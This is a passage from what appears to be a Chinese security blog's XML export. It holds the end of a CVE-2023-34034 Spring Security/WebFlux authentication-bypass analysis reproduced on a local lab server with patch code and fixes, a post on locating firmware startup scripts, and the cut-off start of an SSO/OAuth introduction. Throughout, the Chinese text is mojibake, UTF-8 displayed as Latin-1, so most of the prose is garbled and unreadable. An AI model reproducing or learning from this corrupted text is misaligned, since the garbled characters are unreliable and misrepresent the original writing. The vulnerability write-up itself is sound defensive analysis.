<p>è¿™ç¯‡å¸–å­é‡Œå·²ç»ç”±å…³äºè¯¥æ¼æ´è¾ƒå¤šçš„ä¿¡æ¯æ³„éœ²äº†ã€‚åŸæ¥åœ¨Spring Securityä¸­â€**â€œä¸èƒ½åŒ¹é…è·¯å¾„åˆ†éš”ç¬¦â€&#x2F;â€œï¼Œè€Œåœ¨Spring WebFluxä¸­å´å¯ä»¥åŒ¹é…è·¯å¾„åˆ†éš”ç¬¦ã€‚</p>
<p>å¯èƒ½çœ‹åˆ°è¿™é‡Œï¼Œæˆ‘ä»¬å¯¹å…·ä½“çš„ç»•è¿‡å§¿åŠ¿è¿˜ä¸æ˜¯ç‰¹åˆ«æ¸…æ¥šã€‚åœ¨è¯¥é€šå‘Šçš„æœ€åæä¾›äº†è¯¥æ¼æ´çš„ä¿®å¤è®°å½•ï¼š</p>
<p><a href="https://github.com/spring-projects/spring-security/commit/7813a9ba26e53fe54e4d2ec6eb076126e8550780">https://github.com/spring-projects/spring-security/commit/7813a9ba26e53fe54e4d2ec6eb076126e8550780</a></p>
<p>åœ¨è¯¥ä¿®å¤è®°å½•ä¸­ï¼Œå¢åŠ äº†ä¸€å¤„æµ‹è¯•ä»£ç ï¼š</p>
<p><img src="/archives/fe3c6472/image-20230822102847635.png" alt="image-20230822102847635"></p>
<p>è¯¥æµ‹è¯•æ¨¡æ‹Ÿäº†ä¸€ä¸ªHTTPè¯·æ±‚â€&#x2F;user&#x2F;testâ€œï¼Œç„¶åå°†å…¶ä¸è·¯å¾„æ¨¡å¼â€user&#x2F;**â€œè¿›è¡Œæ¯”è¾ƒï¼Œå¦‚æœæ¯”è¾ƒç»“æœä¸º<code>True</code>åˆ™æµ‹è¯•é€šè¿‡ã€‚é‚£ä¹ˆæˆ‘ä»¬æƒ³æƒ³ï¼Œè¿™æ˜¯ä¸æ˜¯è¯´æ¼æ´æ²¡æœ‰ä¿®å¤å‰è¿™ä¸ªæ¯”è¾ƒç»“æœä¸ºFalseï¼Œä¹Ÿå°±æ˜¯è¯´å¯¹äºæ²¡æœ‰å‰å¯¼â€&#x2F;â€œå¹¶ä½¿ç”¨äº†â€**â€œçš„è·¯å¾„æ¨¡å¼æ˜¯ä¸èƒ½åŒ¹é…å¸¦å‰å¯¼â€&#x2F;â€œçš„è·¯å¾„çš„ï¼Ÿæ€€ç€è¿™æ ·çš„æƒ³æ³•ï¼Œæˆ‘ä»¬ä¿®æ”¹æˆ‘ä»¬çš„è°ƒè¯•ç¯å¢ƒä»£ç è¿›è¡Œæµ‹è¯•ã€‚</p>
<p>åœ¨æ§åˆ¶å™¨ä¸­è®¾ç½®ä¸€ä¸ªä¸å¸¦å‰å¯¼â€&#x2F;â€œçš„è·¯å¾„æ¨¡å¼</p>
<p><img src="/archives/fe3c6472/image-20230822103307585.png" alt="image-20230822103307585"></p>
<p>åŒæ ·åœ¨Spring Securityä¸­ä¹Ÿè®¾ç½®ä¸€ä¸ªåŒæ ·ä¸å¸¦å‰å¯¼â€&#x2F;â€œçš„è·¯å¾„æ¨¡å¼ï¼Œä¸¤è€…ä¿æŒä¸€è‡´ï¼Œä¸”è®¿é—®è¯¥è·¯å¾„éœ€è¦è¿›è¡Œæƒé™æ ¡éªŒï¼Œå¹¶ä¸”å…¶ä½™æ‰€æœ‰çš„è¯·æ±‚éƒ½ä¸éœ€è¦è®¤è¯</p>
<p><img src="/archives/fe3c6472/image-20230822103337537.png" alt="image-20230822103337537"></p>
<p>æ­¤æ—¶å°†ç¨‹åºè¿è¡Œèµ·æ¥ï¼Œç„¶åè®¿é—®<code>http://127.0.0.1:8080/hello-dev/test</code></p>
<p><img src="/archives/fe3c6472/image-20230822103649543.png" alt="image-20230822103649543"></p>
<p>å‘ç°WebFluxæ­£ç¡®åœ°åŒ¹é…åˆ°äº†è¯¥è·¯å¾„ï¼Œä½†Spring Securityå´å¹¶æ²¡æœ‰åŒ¹é…åˆ°ï¼ˆè‹¥åŒ¹é…åˆ°åº”æç¤ºè¿›è¡Œæœªç™»å½•ï¼‰ï¼Œè¿™æ­£å¥½å°è¯äº†æ¼æ´æè¿°ä¸­è¯´çš„Spring Securityä¸Spring WebFluxåŒ¹é…è§„åˆ™ä¸ä¸€è‡´çš„é—®é¢˜ã€‚ä¸ºäº†è¿›ä¸€æ­¥ç¡®è®¤ï¼Œæˆ‘ä»¬åœ¨Spring Securityè®¤è¯ä»£ç ä¸­å¢åŠ å‰å¯¼â€&#x2F;â€œ</p>
<p><img src="/archives/fe3c6472/image-20230822103935948.png" alt="image-20230822103935948"></p>
<p>å†æ¬¡è®¿é—®<code>http://127.0.0.1:8080/hello-dev/test</code></p>
<p><img src="/archives/fe3c6472/image-20230822104027172.png" alt="image-20230822104027172"></p>
<p>å“åº”ç»“æœæç¤ºæœªç™»å½•äº†ã€‚è‡³æ­¤ï¼Œæˆ‘ä»¬å·²ç»äº†è§£äº†è¯¥æ¼æ´çš„è¡¨ç°å½¢å¼ä»¥åŠåˆ©ç”¨æ–¹æ³•ã€‚è¦å®Œæˆè¯¥æ¼æ´çš„åˆ©ç”¨éœ€è¦ç¨‹åºå‘˜é”™è¯¯çš„Spring Security è·¯å¾„æ¨¡å¼è®¾ç½®ï¼Œå³æœªç»™è·¯å¾„æ·»åŠ å‰å¯¼â€&#x2F;â€œï¼Œæƒ³æ¥è¿™ç§æƒ…å†µæ˜¯æ¯”è¾ƒå°‘è§çš„ï¼Œæ‰€ä»¥è¯¥æ¼æ´çš„å½±å“å…¶å®æ˜¯æœ‰é™çš„ã€‚</p>
<p>çŸ¥é“äº†æ¼æ´çš„è¡¨å¾ï¼Œæˆ‘ä»¬ä»éœ€è¦æŸ¥çœ‹ä¸€ä¸‹è¡¥ä¸ä»¥ç¡®è®¤è¯¥æ¼æ´æ˜¯å¦çœŸå¦‚æˆ‘ä»¬çŒœæƒ³çš„è¿™æ ·ï¼Œåœ¨<code>config/src/main/java/org/springframework/security/config/web/server/AbstractServerWebExchangeMatcherRegistry.java</code> ä¸­æ–°å¢äº†ä»¥ä¸‹ä»£ç ã€‚</p>
<p><img src="/archives/fe3c6472/image-20230822104416434.png" alt="image-20230822104416434"></p>
<p>è¯¥ä¿®æ”¹ä¸»è¦ä¿®æ”¹äº†<code>pathMatchers(java.lang.String...)</code>æ–¹æ³•çš„å®ç°é€»è¾‘ï¼Œåœ¨è¿›è¡Œè·¯å¾„åŒ¹é…å‰é¦–å…ˆè°ƒç”¨äº†<code>parsePatterns</code>æ–¹æ³•å¯¹è·¯å¾„æ¨¡å¼è¿›è¡Œè§£æã€‚<code>parsePatterns</code>æ–¹æ³•å…ˆè·å–åˆ°ä¸€ä¸ªé»˜è®¤çš„è·¯å¾„æ¨¡å¼è§£æå™¨<code>parser</code>ï¼Œç„¶åè°ƒç”¨å…¶<code>initFullPathPattern</code>æ–¹æ³•ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> String <span class="title function_">initFullPathPattern</span><span class="params">(String pattern)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> StringUtils.hasLength(pattern) &amp;&amp; !pattern.startsWith(<span class="string">&quot;/&quot;</span>) ? <span class="string">&quot;/&quot;</span> + pattern : pattern;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>è¯¥æ–¹æ³•åˆ¤æ–­ä¼ å…¥çš„è·¯å¾„æ¨¡å¼çš„é•¿åº¦è‹¥ä¸ä¸º0ï¼Œåˆ™åˆ¤æ–­å…¶æ˜¯å¦ä»¥â€&#x2F;â€œå¼€å¤´ï¼Œè‹¥ä¸æ˜¯åˆ™æ·»åŠ å‰å¯¼â€&#x2F;â€œï¼Œå³å¼ºåˆ¶è·¯å¾„æ¨¡å¼ä»¥â€&#x2F;â€œå¼€å¤´ï¼Œä»è€Œé¿å…äº†è¯¥æ¼æ´ã€‚</p>
<p>å¦ä¸€æ–¹é¢æ—¢ç„¶å­˜åœ¨æ¼æ´ç‰ˆæœ¬çš„Spring WebFluxèƒ½å¤Ÿæ­£ç¡®è§£ææ— å‰å¯¼â€&#x2F;â€œçš„æƒ…å†µï¼Œæˆ‘ä»¬ä»éœ€çœ‹çœ‹å…¶è§£æé€»è¾‘ã€‚Spring WebFluxåœ¨æ‰«æControlleræ—¶ä¼šä¾æ¬¡æ‰«æå„æ–¹æ³•çš„æ³¨è§£ï¼Œè€Œè¿™äº›æ³¨è§£çš„å¤„ç†ç±»åœ¨<code>org.springframework.web.reactive.result.method.annotation</code>åŒ…ä¸‹é¢ï¼Œè€Œå¤„ç†<code>RequestMapping</code>çš„å¤„ç†å™¨ä¸º<code>RequestMappingHandlerMapping</code>ï¼Œåœ¨Beanè£…è½½æ—¶æœ€ç»ˆä¼šè°ƒç”¨åˆ°å…¶<code>createRequestMappingInfo</code>æ–¹æ³•ã€‚</p>
<p><img src="/archives/fe3c6472/image-20230822142906974.png" alt="image-20230822142906974"></p>
<p><img src="/archives/fe3c6472/image-20230822143112720.png" alt="image-20230822143112720"></p>
<p>è¯¥æ–¹æ³•é¦–å…ˆä¼šè§£æelementæ˜¯å¦å«æœ‰RequestMappingè¿™ä¸ªæ³¨è§£ï¼Œelementæ˜¯ä¸€ä¸ªMethodå¯¹è±¡ã€‚å¦‚æœæœ‰å†è°ƒç”¨<code>createRequestMappingInfo</code>çš„é‡è½½æ–¹æ³•ã€‚</p>
<p><img src="/archives/fe3c6472/image-20230822143204862.png" alt="image-20230822143204862"></p>
<p>åœ¨è¯¥æ–¹æ³•ä¸­é¦–å…ˆä¼šåˆ›å»ºä¸€ä¸ªbuilderï¼Œå…¶å°è£…äº†RequestMappingè®¾ç½®çš„è¯·æ±‚æ–¹æ³•ã€è·¯å¾„ã€å‚æ•°ã€è¯·æ±‚å¤´ç­‰æ¡ä»¶ï¼Œç„¶åè°ƒç”¨buildæ–¹æ³•å‡†å¤‡æ„å»ºä¸€ä¸ª<code>RequestMappingInfo</code>å¯¹è±¡ã€‚</p>
<p><img src="/archives/fe3c6472/image-20230822143515644.png" alt="image-20230822143515644"></p>
<p>æ³¨æ„åˆ°æ­¤æ—¶è®¾ç½®çš„è·¯å¾„åŒ¹é…æ¨¡å¼ä»ç„¶æ²¡æœ‰å‘ç”Ÿå˜åŒ–ï¼Œåœ¨è°ƒç”¨parseæ–¹æ³•åä¼šå‘ç”Ÿä»€ä¹ˆï¼Ÿ</p>
<p><img src="/archives/fe3c6472/image-20230822143646588.png" alt="image-20230822143646588"></p>
<p>parseæ–¹æ³•ä¼šåˆ¤æ–­è·¯å¾„åŒ¹é…æ¨¡å¼æ˜¯å¦ä¸€â€&#x2F;â€œå¼€å¤´ï¼Œè‹¥ä¸æ˜¯åˆ™è¡¥å……ã€‚å¦‚æ­¤ä¾¿èƒ½æ­£å¸¸åœ°è¿›è¡Œè·¯å¾„åŒ¹é…ï¼Œè¿™ä¸å­˜åœ¨æ¼æ´çš„Spring Securityç‰ˆæœ¬å¤„ç†é€»è¾‘ä¸åŒï¼Œæ•…ä¸¤è€…çš„å·®å¼‚å¯¼è‡´äº†æ¼æ´äº§ç”Ÿã€‚</p>
<h2 id="ä¿®å¤æªæ–½"><a href="#ä¿®å¤æªæ–½" class="headerlink" title="ä¿®å¤æªæ–½"></a>ä¿®å¤æªæ–½</h2><ol>
<li>å‡çº§è½¯ä»¶åˆ°ä¸å—å½±å“çš„ç‰ˆæœ¬æˆ–æœ€æ–°ç‰ˆï¼Œå®˜æ–¹ä»“åº“åœ°å€ï¼š<a href="https://github.com/spring-projects/spring-security/%EF%BC%9B">https://github.com/spring-projects/spring-security/ï¼›</a></li>
<li>è§„èŒƒç¼–ç ï¼Œé¿å…ä¸è§„èŒƒçš„è·¯å¾„åŒ¹é…æ¨¡å¼ã€‚</li>
</ol>
<h2 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h2><ul>
<li><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-34034">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-34034</a></li>
<li><a href="https://www.cvedetails.com/cve-details.php?t=1&cve_id=CVE-2023-34034">https://www.cvedetails.com/cve-details.php?t=1&amp;cve_id=CVE-2023-34034</a></li>
<li><a href="https://www.cnnvd.org.cn/home/globalSearch?keyword=CVE-2023-34034">https://www.cnnvd.org.cn/home/globalSearch?keyword=CVE-2023-34034</a></li>
<li><a href="https://spring.io/security/cve-2023-34034">https://spring.io/security/cve-2023-34034</a></li>
<li><a href="https://www.oschina.net/news/249933">https://www.oschina.net/news/249933</a></li>
<li><a href="https://github.com/spring-projects/spring-security/commit/7813a9ba26e53fe54e4d2ec6eb076126e8550780">https://github.com/spring-projects/spring-security/commit/7813a9ba26e53fe54e4d2ec6eb076126e8550780</a></li>
</ul>
]]></content>
      <categories>
        <category>æ¼æ´åˆ†æ</category>
        <category>å®‰å…¨æŠ€æœ¯</category>
      </categories>
      <tags>
        <tag>ç½‘ç»œå®‰å…¨</tag>
        <tag>æ¼æ´åˆ†æ</tag>
        <tag>æ¼æ´</tag>
        <tag>è®¤è¯ç»•è¿‡</tag>
        <tag>WebFlux Security</tag>
        <tag>CVE-2023-34034</tag>
      </tags>
  </entry>
  <entry>
    <title>å¦‚ä½•å¿«é€Ÿåœ¨è®¾å¤‡ä¸­æŸ¥æ‰¾ç¨‹åºå¯åŠ¨è„šæœ¬</title>
    <url>/archives/f0acb5c0.html</url>
    <content><![CDATA[<p>åœ¨æ‹¿åˆ°è®¾å¤‡å›ºä»¶æˆ–è€…é•œåƒæ–‡ä»¶åï¼Œè‹¥è¦è¿›è¡Œæ›´è¿›ä¸€æ­¥çš„æ¼æ´æŒ–æ˜ï¼Œæˆ‘ä»¬ä¾¿éœ€è¦æ‰¾åˆ°ä¸å½“å‰è®¾å¤‡åŠŸèƒ½ç›¸å…³è”çš„è½¯ä»¶çš„ä½ç½®ä¸å¯åŠ¨æ–¹å¼ç­‰ä¿¡æ¯ã€‚<br>ä¸€èˆ¬æ¥è®²å¦‚æœåªçŸ¥é“è½¯ä»¶çš„ä½ç½®ä¾¿è¿›è¡Œåˆ†æå¯èƒ½æªæ–½å¾ˆå¤šå…³é”®çš„ä¿¡æ¯ï¼Œå¦‚ï¼šç¨‹åºè¿è¡Œæ—¶è®¾ç½®çš„ç¯å¢ƒå˜é‡ä»¥åŠä¸€äº›é…ç½®ä¿¡æ¯çš„è®¾ç½®ã€‚  </p>
<span id="more"></span>

<p>å¤§å¤šæ•°æƒ…å†µä¸‹ï¼Œç¨‹åºåœ¨å¯åŠ¨æ—¶å¹¶ä¸æ˜¯ç›´æ¥ä»elfæ–‡ä»¶å¯åŠ¨ï¼Œè€Œæ˜¯å¯åŠ¨è‡ªshellè„šæœ¬ï¼ŒåŒæ—¶ä¸ºäº†èƒ½å¤Ÿè®©ç¨‹åºåœ¨æ¯æ¬¡é‡å¯ç³»ç»Ÿæˆ–è€…å¼€æœºæ—¶è‡ªåŠ¨å¯åŠ¨ï¼Œ<br>è¿™äº›ç¨‹åºå¾€å¾€è¢«æ³¨å†Œæˆserviceå¯èƒ½è¢«åµŒå…¥åˆ°ä¸€äº›å…¶ä»–åœ¨linuxå¯åŠ¨è¿‡ç¨‹ä¸­ä¼šè‡ªåŠ¨æ‰§è¡Œçš„è„šæœ¬æˆ–è€…ç›®å½•ä¸­ã€‚ä¸ºäº†å˜æ¸…åœ¨linuxå¯åŠ¨è¿‡ç¨‹ä¸­ç©¶ç«Ÿæœ‰å“ªäº›è„šæœ¬è¢«è‡ªåŠ¨æ‰§è¡Œäº†ï¼Œ<br>æˆ‘ä»¬é¦–å…ˆéœ€è¦å¯¹linuxçš„å¯åŠ¨è¿‡ç¨‹æœ‰ä¸€ä¸ªå¤§æ¦‚å¾—äº†è§£ã€‚  </p>
<p>åœ¨ç”¨æˆ·æŒ‰ä¸‹ç”µæºæŒ‰é’®å¯åŠ¨ç³»ç»Ÿæ˜¯ï¼Œé¦–å…ˆå‘æŒ¥æ€»ç”¨çš„æ˜¯biosç³»ç»Ÿï¼Œå¯ä¸»è¦å®Œæˆçš„åŠŸèƒ½åŒ…æ‹¬POSTï¼Œå³å¼€æœºè‡ªæ£€ï¼Œä¸»è¦å®Œæˆå¯¹ç³»ç»Ÿçš„ç¡¬ä»¶è¿›è¡Œæ£€æŸ¥ç­‰å·¥ä½œï¼›<br>åœ¨biosç³»ç»Ÿå®Œæˆå…¶ä½¿å‘½åæœŸä¼šé€šè¿‡å…¶å†…éƒ¨è®¾ç½®å»å°è¯•è®¿é—®ä¸åŒçš„å­˜å‚¨ä»‹è´¨å°è¯•æ‹‰èµ·ç³»ç»Ÿï¼Œ<br>åœ¨Windosä¸‹è¿›è¡ŒPEå¯åŠ¨æ—¶æˆ‘ä»¬å¾€å¾€ä¼šè¿›å…¥åˆ°biosé€‰æ‹©æ“ä½œç³»ç»Ÿçš„å¼•å¯¼ä½ç½®ä¸ºUSBå°±æ˜¯è¿™ä¸€è¿‡ç¨‹çš„ä½“ç°ï¼Œä¸€èˆ¬æƒ…å†µä¸‹ï¼Œæ“ä½œç³»ç»Ÿçš„å¼•å¯¼ä½ç½®éƒ½æ˜¯ç¡¬ç›˜ï¼›<br>åœ¨å †ç¡¬ç›˜è¿›è¡Œè®¿é—®æ—¶ï¼Œé¦–å…ˆä¼šè¯»å–ç¡¬ç›˜çš„ä¸»å¼•å¯¼åˆ†åŒºä¸­çš„ä¿¡æ¯ï¼Œä½å¼•å¯¼åˆ†åŒºä¸­å­˜å‚¨ç€çš„ä¾¿æ˜¯æˆ‘ä»¬é€šå¸¸æ‰€è¯´çš„bootloaderï¼ˆæ‹‰ç€è‡ªå·±é‹å¸¦å‘ä¸Šæï¼‰ï¼Œ<br>bootloaderä¸€èˆ¬åŒ…æ‹¬ä¸¤éƒ¨åˆ†ï¼Œä¸€éƒ¨åˆ†ç”±æ±‡ç¼–ç¼–å†™ï¼Œä¸»è¦å®Œæˆä¸€äº›ä¾èµ–CPUä½“ç³»çš„åˆå§‹åŒ–å·¥ä½œï¼Œå¹¶è°ƒç”¨ç¬¬äºŒéƒ¨åˆ†ä»£ç ï¼Œç¬¬äºŒéƒ¨åˆ†ç”±Cè¯­è¨€æ¥å®ç°ï¼Œ<br>å¸¸è§çš„bootloaderåŒ…æ‹¬grub grub2 ubootç­‰ï¼Œæˆ‘ä»¬åœ¨å¯åŠ¨linuxæ—¶é€šå¸¸ä¼šè§åˆ°ä¸€ä¸ªè®©æˆ‘ä»¬é€‰æ‹©ç³»ç»Ÿå†…æ ¸ç‰ˆæœ¬çš„ç•Œé¢ï¼Œè¯¥ç•Œé¢å°±æ˜¯bootloaderåœ¨èµ·ä½œç”¨ï¼›<br>åœ¨bootloaderå°†æ“ä½œç³»ç»Ÿå†…æ ¸åŠ è½½åˆ°å†…å­˜ä¸­åå°†å¼€å§‹è¿è¡Œæ“ä½œç³»ç»Ÿçš„ç¬¬ä¸€ä¸ªç¨‹åºï¼Œåœ¨æœ€æ–°ç‰ˆæœ¬çš„linuxä¸­é€šå¸¸æ˜¯systemdç¨‹åºè€Œåœ¨è¾ƒä½ç‰ˆæœ¬ä¸­å¯èƒ½æ˜¯initï¼›<br>ä¹‹åä¼šé€‰æ‹©ç³»ç»Ÿçš„è¿è¡Œçº§åˆ«runlevelï¼Œåœ¨æ­¤è¿‡ç¨‹ä¸­ä¼šåŠ è½½è¿è¡Œä¸€äº›etcrc.dç›®å½•ä¸‹çš„è„šæœ¬è¿è¡Œï¼›å†ä¹‹åä¾¿ä¼šè¿›å…¥åˆ°ç”¨æˆ·ç™»å½•é€‰é¡¹äº†ï¼Œ<br>åœ¨ç”¨æˆ·è¾“å…¥æ­£ç¡®çš„ç”¨æˆ·åå¯†ç ç™»å½•åä¼šåŠ è½½etcprofile - etcprofile.d.sh -~.bash_profile - ~.bashrc - etcbashrcç­‰æ–‡ä»¶åˆå§‹åŒ–ç¯å¢ƒå˜é‡ã€‚  </p>
<p>åœ¨linuxå¯åŠ¨è¿‡ç¨‹ä¸­å‡¡æ˜¯æ¶‰åŠåˆ°è‡ªåŠ¨è„šæœ¬æ‰§è¡Œçš„åœ°æ–¹éƒ½æœ‰å¯èƒ½è¢«ä¿®æ”¹æ’å…¥è®¾å¤‡ç¨‹åºå¯åŠ¨è„šæœ¬çš„åœ°æ–¹ï¼Œåœ¨æŸ¥æ‰¾æ—¶å¯ä»¥é€ä¸€æ’æŸ¥ã€‚<br>ä¸è¿‡ï¼Œä¸€èˆ¬æƒ…å†µä¸‹æ›´æ™®éçš„åšæ³•æ˜¯å°†ç¨‹åºçš„å¯åŠ¨è¿‡ç¨‹æ³¨å†Œä¸ºserviceã€‚linuxç³»ç»Ÿä¸­çš„serviceå¯ä»¥é€šè¿‡å‘½ä»¤systemctl æŸ¥çœ‹ï¼Œ<br>æ‰¾åˆ°æˆ‘ä»¬æ„Ÿå…´è¶£çš„æœåŠ¡ç„¶åæ‰§è¡Œsystemctl show service_nameä¾¿å¯ä»¥æŸ¥çœ‹ä¸è¯¥æœåŠ¡ç›¸å…³çš„ä¿¡æ¯ï¼Œæˆ‘ä»¬å¯ä»¥ä»ä¸­æ‰¾åˆ°æœåŠ¡çš„å­˜å‚¨ä½ç½®ï¼Œ<br>å¦‚ï¼šetcsystemdsystemdefault.target.wants.service  usrlibsystemdsystem.service  æŸ¥çœ‹å¯¹åº”çš„serviceæ–‡ä»¶æˆ‘ä»¬ä¾¿å¯ä»¥æ‰¾åˆ°ç›¸å…³çš„å¯åŠ¨è„šæœ¬æ‰€åœ¨ä½ç½®ï¼Œ<br>ç„¶åé€šè¿‡é˜…è¯»å¯åŠ¨è„šæœ¬äº†è§£ç¨‹åºå¯åŠ¨è¿‡ç¨‹ä¸­è®¾ç½®çš„ç¯å¢ƒå˜é‡ã€é…ç½®ã€å¯åŠ¨å‚æ•°ç­‰ä¿¡æ¯ã€‚  </p>
<p>é™¤äº†è¿™ç§è¿½æœ¬æº¯æºçš„æ–¹å¼ï¼Œè¿˜æœ‰ä¸€ç§æ›´åŠ ç®€å•ç›´æ¥çš„æ–¹å¼ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡æŸ¥è¿›ç¨‹çš„æ–¹å¼æ‰¾åˆ°ç›¸å…³å¾—ä¿¡æ¯ã€‚æ¯”å¦‚æˆ‘ä»¬è¦æ‰¾ä¸€ä¸ªjavaç¨‹åºï¼Œ<br>å¯ä»¥ç›´æ¥æ‰§è¡Œps -ef  grep java  ä¾¿å¯ä»¥æ‰¾åˆ°ç›¸å…³çš„ç¨‹åºçš„å¯åŠ¨å‘½ä»¤ã€‚å¦‚æœåªçŸ¥é“å¯åŠ¨çš„ç«¯å£ï¼Œæˆ‘ä»¬å¯ä»¥å…ˆæ‰§è¡Œnetstat -tulnpæŸ¥çœ‹åˆ°å¯¹åº”çš„PIDä¿¡æ¯ï¼Œ<br>ç„¶åé€šè¿‡PIDä½¿ç”¨å‘½ä»¤pså‘½ä»¤ä¹Ÿå¯ä»¥ã€‚  </p>
]]></content>
      <categories>
        <category>å®‰å…¨æŠ€æœ¯</category>
      </categories>
      <tags>
        <tag>ç½‘ç»œå®‰å…¨</tag>
        <tag>æ¼æŒ–æŠ€å·§</tag>
      </tags>
  </entry>
  <entry>
    <title>SSOè§£å†³æ–¹æ¡ˆç®€ä»‹</title>
    <url>/archives/ad6b67bf.html</url>
    <content><![CDATA[<h1 id="ä»€ä¹ˆæ˜¯SSOï¼Œä¸ºä»€ä¹ˆéœ€è¦SSO"><a href="#ä»€ä¹ˆæ˜¯SSOï¼Œä¸ºä»€ä¹ˆéœ€è¦SSO" class="headerlink" title="ä»€ä¹ˆæ˜¯SSOï¼Œä¸ºä»€ä¹ˆéœ€è¦SSO"></a>ä»€ä¹ˆæ˜¯SSOï¼Œä¸ºä»€ä¹ˆéœ€è¦SSO</h1><p>å¦‚æœå•ä»å­—é¢æ„æ€æ¥ç†è§£ï¼ŒSSOè¡¨è¾¾äº†ä¸€ç§ä»€ä¹ˆæ ·çš„å«ä¹‰ï¼Ÿæˆ‘ä»¬çŸ¥é“ï¼ŒSSOçš„ä¸­æ–‡ç¿»è¯‘ä¸ºå•ç‚¹ç™»å½•ï¼Œé¡¾åæ€ä¹‰ï¼Œå³ä¸ºå•ç‚¹ï¼Œåˆ™è¡¨ç¤ºåœ¨ä¸€ä¸ªåœ°æ–¹ç™»å½•ï¼Œç™»å½•çš„ç»“æœä¾¿æ˜¯å¯ä»¥åœ¨å¤šä¸ªåœ°æ–¹è¢«ä½¿ç”¨ã€‚åœ¨ç”Ÿæ´»ä¸­å¸¸è§çš„B&#x2F;Såœºæ™¯ä¸‹ï¼Œæˆ‘ä»¬æœ‰æ—¶éœ€è¦é€šè¿‡ç”¨æˆ·åå¯†ç æ¥å£°æ˜æˆ‘ä»¬å¯¹æŸä¸ªç½‘ç«™çš„æŸäº›èµ„æºå…·æœ‰è®¿é—®æƒé™ï¼Œå¦‚æœå­˜åœ¨å¤šä¸ªè¿™æ ·çš„ç½‘ç«™ï¼Œå‡ºäºå®‰å…¨è€ƒè™‘æˆ‘ä»¬å¯èƒ½å°±éœ€è¦æ¯ä¸€ä¸ªç½‘ç«™å‡é€šè¿‡ä¸åŒçš„ç”¨æˆ·åå¯†ç æ¥å£°æ˜å¯¹è¿™äº›èµ„æºçš„è®¿é—®æƒé™ï¼Œè¿™å°±å¯¼è‡´æˆ‘ä»¬éœ€è¦è®°å½•å¤§é‡çš„å¯†ç ä»¥åŠåå¤å®Œæˆç™»å½•æ“ä½œï¼Œè¿™ä¸ªè¿‡ç¨‹æ˜¯ç¹çä¸”å®¹æ˜“å‡ºé”™çš„ã€‚SSOçš„å‡ºç°ä¾¿èƒ½åœ¨ä¸€å®šç¨‹åº¦ä¸Šå¯¹è¿™ä¸ªç¼ºé™·è¿›è¡Œå¼¥è¡¥ã€‚</p>
<p>å½“ç„¶ï¼Œå¦‚æœä»…ä»…æ˜¯å‡ºäºä¾¿åˆ©æ€§çš„éœ€è¦ï¼ŒSSOæŠ€æœ¯å¯èƒ½ä»ä¸æ˜¯é‚£ä¹ˆç´§è¦ã€‚SSOæŠ€æœ¯ä½¿å¾—å¯¹äºæŸä¸€ç±»ç½‘ç«™ï¼Œå¦‚ï¼šåŒä¸€å…¬å¸æ——ä¸‹çš„ä¸€ç»„ç½‘ç«™ï¼Œç”¨æˆ·åªéœ€åœ¨æŸä¸€ä¸ªç»Ÿä¸€çš„å…¥å£å®Œæˆä¸€æ¬¡ç™»å½•æ“ä½œä¾¿å¯åŒæ—¶è®¿é—®è¿™ä¸€ç»„ç½‘ç«™æ‰€æœ‰çš„å—é™èµ„æºï¼Œå¹¶èƒ½å¤Ÿå®Œæˆæƒé™æ§åˆ¶ã€ç»Ÿä¸€çš„ä¼šè¯ç®¡ç†ã€ç»Ÿä¸€çš„èµ„æºåˆ†é…ç­‰å…¶ä»–æ“ä½œï¼Œè¿™ä½¿å¾—å—é™èµ„æºçš„ä¿å¯†æ€§ã€å®Œæ•´æ€§ä»¥åŠå¯ç”¨æ€§æœ‰ä¸åŒç¨‹åº¦çš„æé«˜ã€‚</p>
<p>SSOæŠ€æœ¯ä¸ä»…ä»…æ˜¯å¯¹ç”¨æˆ·è®¤è¯äº§ç”Ÿäº†æ­£å‘çš„å½±å“ï¼Œå…¶è§£å†³çš„å¦ä¸€ä¸ªé—®é¢˜æ˜¯ä¸ºä¸å—ä¿¡ç¬¬ä¸‰æ–¹è·å–èµ„æºæä¾›äº†ä¸€æ•´å¥—çš„è§£å†³æ–¹æ¡ˆï¼Œå³ç¬¬ä¸‰æ–¹è·å–èµ„æºçš„æˆæƒé—®é¢˜ã€‚</p>
<p>æˆ‘ä»¬ä¾‹ä¸¾ä¸€ä¸ªå…·ä½“çš„SSOæŠ€æœ¯æ–¹æ¡ˆæ¥è¿›è¡Œè¯´æ˜ï¼Œè¿™é‡Œå¼•ç”¨OAuth2.0 è§„èŒƒä¸­å…³äºä¸ºä»€ä¹ˆéœ€è¦OAuthçš„è¯´æ˜ã€‚</p>
<p>ä¼ ç»Ÿçš„å—é™èµ„æºè®¿é—®æ–¹æ¡ˆå¾€å¾€æ˜¯é€šè¿‡ä½¿ç”¨èµ„æºæ‰€æœ‰è€…çš„è®¿é—®å‡­æ®æ¥è·å–èµ„æºçš„è®¿é—®æƒé™ï¼Œè¿™ç§é€šè¿‡æ˜æ–‡å‡­æ®çš„è®¿é—®æ–¹æ¡ˆå¾€å¾€ç”¨äºå£°æ˜ç”¨æˆ·å¯¹æŸä¸ªèµ„æºçš„æ‰€æœ‰æƒï¼Œè€Œä¸èƒ½å¾ˆå¥½åœ°å‘ç¬¬ä¸‰æ–¹è¿›è¡Œèµ„æºåˆ†é…ã€‚ä¼ ç»Ÿåœ°æ–¹æ¡ˆåœ¨åº”ç”¨äºç¬¬ä¸‰æ–¹åº”ç”¨å¯¹å—é™èµ„æºçš„æ–¹å¼æ—¶å¾€å¾€ä¼šé¢ä¸´ä»¥ä¸‹å››ä¸ªæ–¹é¢çš„é—®é¢˜ï¼š</p>
<ul>
